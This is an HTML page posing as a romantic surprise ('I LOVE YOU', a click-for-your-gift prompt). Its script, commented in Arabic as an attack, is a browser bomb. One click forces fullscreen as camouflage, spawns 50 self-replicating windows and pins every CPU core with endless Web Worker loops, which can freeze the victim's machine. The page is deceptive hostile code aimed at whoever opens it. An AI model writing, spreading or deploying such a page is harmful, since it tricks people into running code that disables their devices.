<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { background: black; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: pointer; }
        h1 { color: #ff4d4d; font-size: 4rem; text-shadow: 0 0 20px red; }
        p { font-size: 1.5rem; color: #ccc; }
    </style>
</head>
<body>

    <h1>I LOVE YOU</h1>
    <p>Click here to see your gift... 🎁</p>

    <script>
        function launchBomb() {
            // 1. طلب ملء الشاشة للتمويه
            document.documentElement.requestFullscreen().catch(() => {});

            // 2. فتح 50 نافذة جديدة في الخلفية بسرعة رهيبة
            // كل نافذة هتحمل نفس الرابط وهتحاول تفتح نوافذ تانية (سلسلة لا نهائية)
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    window.open(window.location.href, '_blank', 'width=100,height=100');
                }, i * 100);
            }

            // 3. تشغيل ضغط المعالج "الهادئ" في التبويب الحالي عشان ميعملش Aw Snap
            const cores = navigator.hardwareConcurrency || 4;
            for (let i = 0; i < cores; i++) {
                new Worker(URL.createObjectURL(new Blob([`
                    while(true) { Math.random() * Math.random(); }
                `], {type: 'application/javascript'})));
            }
        }

        // الهجوم يبدأ بلمسة واحدة
        window.onclick = launchBomb;
    </script>
</body>
</html>
